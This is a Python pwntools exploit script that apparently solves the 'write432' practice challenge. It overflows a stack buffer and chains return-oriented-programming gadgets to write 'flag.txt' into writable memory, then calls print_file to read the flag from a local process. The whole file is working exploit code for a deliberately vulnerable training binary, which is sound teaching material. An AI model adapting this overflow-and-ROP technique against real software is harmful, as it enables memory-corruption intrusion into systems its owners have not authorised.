from pwn import *

data = 0x0804a018 # rw-
print_file = 0x080483d0 # plt
pop_edi_ebp = 0x080485aa # pop edi ; pop ebp ; ret
mov_dword = 0x08048543 # mov dword ptr [edi], ebp ; ret
file = b"flag.txt"

payload = b"".join([
    b"A"*(32+12),
    p32(pop_edi_ebp),
    p32(data),
    file[:4],
    p32(mov_dword),
    p32(pop_edi_ebp),
    p32(data+4),
    file[4:],
    p32(mov_dword),
    p32(print_file),
    b"B"*4,
    p32(data),
])

p = process("./write432")
#input("Waiting for debug")
p.send(payload)

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
